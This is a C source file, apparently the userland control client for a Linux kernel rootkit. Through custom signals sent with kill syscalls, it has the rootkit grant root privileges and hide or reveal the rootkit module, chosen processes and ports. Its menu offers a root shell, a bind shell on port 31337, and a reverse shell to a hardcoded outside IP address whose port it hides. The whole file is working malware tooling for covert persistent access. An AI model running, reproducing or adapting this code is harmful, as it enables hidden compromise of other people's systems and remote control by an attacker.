#include "../src/inc/uapi/rootkit.h"
#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef REMOTE_ADDR
#define REMOTE_ADDR "194.163.157.141"
#endif
#ifndef REMOTE_PORT
#define REMOTE_PORT 31337
#endif
#ifndef LOCAL_PORT
#define LOCAL_PORT 31337
#endif

void send_signals(void)
{
    // Become root
    printf("Sending signal SIGROOT...\n");
    syscall(SYS_kill, PID_SECRET, SIGROOT);

    // Hide process
    printf("Sending signal SIGHIDE...\n");
    syscall(SYS_kill, PID_SELF, SIGHIDE);

    // Authorize process
    printf("Sending signal SIGAUTH...\n");
    syscall(SYS_kill, PID_SELF, SIGAUTH);
}

int hide_port(uint16_t ui16_port)
{
    printf("Hiding port %hu...\n", ui16_port);

    return syscall(SYS_kill, ui16_port, SIGPORTHIDE);
}

int show_port(uint16_t ui16_port)
{
    printf("Showing port %hu...\n", ui16_port);

    return syscall(SYS_kill, ui16_port, SIGPORTSHOW);
}

void print_options(void)
{
    printf("Welcome to the rootkit companion!\n");
    putchar('\n');
    printf("Available options:\n");
    printf("  1: Root shell\n");
    printf("  2: Reverse shell\n");
    printf("  3: Bind shell\n");
    printf("  4: Show rootkit\n");
    printf("  5: Hide rootkit\n");
    printf("  6: Show process\n");
    printf("  7: Hide process\n");
    printf("  8: Show port\n");
    printf("  9: Hide port\n");
    putchar('\n');
    printf("  q: Exit\n");
}

char get_input(void)
{
    char c = 0;

    printf("Enter your choice: ");
    c = getchar();
    while (getchar() != '\n')
        ;

    return c;
}

int spawn_shell(void)
{
    printf("Spawning root shell...\n");
    return execl("/bin/sh", "sh", "-l", NULL);
}

int reverse_shell(void)
{
    int i32_sockfd           = 0;
    int i32_ret              = 0;
    struct sockaddr_in sa_in = { 0 };

    hide_port(REMOTE_PORT);

    printf("Spawning reverse shell to %s:%hu...\n", REMOTE_ADDR, REMOTE_PORT);

    i32_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (i32_sockfd < 0) {
        perror("socket");
        return i32_sockfd;
    }

    sa_in.sin_family      = AF_INET;
    sa_in.sin_port        = htons(REMOTE_PORT);
    sa_in.sin_addr.s_addr = inet_addr(REMOTE_ADDR);

    i32_ret = connect(i32_sockfd, (struct sockaddr *)&sa_in, sizeof(sa_in));
    if (i32_ret < 0) {
        perror("connect");
        return i32_ret;
    }

    dup2(i32_sockfd, 0);
    dup2(i32_sockfd, 1);
    dup2(i32_sockfd, 2);

    i32_ret = execl("/bin/sh", "sh", NULL);

    close(i32_sockfd);
    return i32_ret;
}

int bind_shell(void)
{
    int i32_sockfd           = 0;
    int i32_ret              = 0;
    struct sockaddr_in sa_in = { 0 };

    hide_port(LOCAL_PORT);

    printf("Spawning bind shell on port %hu...\n", LOCAL_PORT);

    i32_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (i32_sockfd < 0) {
        perror("socket");
        return i32_sockfd;
    }

    sa_in.sin_family      = AF_INET;
    sa_in.sin_port        = htons(LOCAL_PORT);
    sa_in.sin_addr.s_addr = htonl(INADDR_ANY);

    i32_ret = bind(i32_sockfd, (struct sockaddr *)&sa_in, sizeof(sa_in));
    if (i32_ret < 0) {
        perror("bind");
        return i32_ret;
    }

    i32_ret = listen(i32_sockfd, 0);
    if (i32_ret < 0) {
        perror("listen");
        return i32_ret;
    }

    i32_ret = accept(i32_sockfd, NULL, NULL);
    if (i32_ret < 0) {
        perror("accept");
        return i32_ret;
    }

    dup2(i32_ret, 0);
    dup2(i32_ret, 1);
    dup2(i32_ret, 2);

    i32_ret = execl("/bin/sh", "sh", NULL);

    close(i32_sockfd);
    return i32_ret;
}

int show_rootkit(void)
{
    printf("Showing rootkit...\n");
    return syscall(SYS_kill, PID_SECRET, SIGMODSHOW);
}

int hide_rootkit(void)
{
    printf("Hiding rootkit...\n");
    return syscall(SYS_kill, PID_SECRET, SIGMODHIDE);
}

int hide_process(pid_t i32_pid)
{
    printf("Hiding process %d...\n", i32_pid);
    return syscall(SYS_kill, i32_pid, SIGHIDE);
}

int show_process(pid_t i32_pid)
{
    printf("Showing process %d...\n", i32_pid);
    return syscall(SYS_kill, i32_pid, SIGSHOW);
}

pid_t get_pid(void)
{
    pid_t i32_pid = 0;

    printf("Enter PID: ");
    scanf("%d", &i32_pid);
    while (getchar() != '\n')
        ;

    return i32_pid;
}

uint16_t get_port(void)
{
    uint16_t ui16_port = 0;

    printf("Enter port: ");
    scanf("%hu", &ui16_port);
    while (getchar() != '\n')
        ;

    return ui16_port;
}

int main(void)
{
    char c_input = 0;

    // Send signals to the rootkit
    send_signals();

    while (c_input != 'q') {
        print_options();
        c_input = get_input();

        switch (c_input) {
        case '1':
            spawn_shell();
            break;
        case '2':
            reverse_shell();
            break;
        case '3':
            bind_shell();
            break;
        case '4':
            show_rootkit();
            break;
        case '5':
            hide_rootkit();
            break;
        case '6':
            show_process(get_pid());
            break;
        case '7':
            hide_process(get_pid());
            break;
        case '8':
            show_port(get_port());
            break;
        case '9':
            hide_port(get_port());
            break;

        case 'q':
            break;

        default:
            printf("Invalid option\n");
            break;
        }

        putchar('\n');
    }

    printf("Exiting...\n");
    return 0;
}
